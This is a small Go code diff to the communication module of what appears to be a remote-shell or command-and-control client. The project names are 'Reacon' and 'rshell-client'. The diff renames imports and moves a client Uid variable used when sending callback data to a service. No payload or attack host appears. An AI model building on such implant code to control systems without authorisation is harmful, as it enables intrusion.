@@ -1,8 +1,8 @@
 package communication
 
 import (
-	"Reacon/pkg/encrypt"
-	"Reacon/pkg/utils"
+	"rshell-client/shared/encrypt"
+	"rshell-client/shared/utils"
 	"bytes"
 	"encoding/binary"
 	"fmt"
@@ -29,6 +29,8 @@ func DataProcess(callbackType int, b []byte) {
 	criticalSection(callbackType, result)
 }
 
+var Uid string
+
 var mutex sync.Mutex
 
 func criticalSection(callbackType int, b []byte) {
@@ -46,7 +48,7 @@ func criticalSection(callbackType int, b []byte) {
 	normalDataBytes := utils.WriteInt(normalDataInt)
 	msgToSend := utils.BytesCombine(normalDataBytes, msg)
 
-	Send(Service, utils.Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), msgToSend)
+	Send(Service, Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), msgToSend)
 	mutex.Unlock()
 }
 
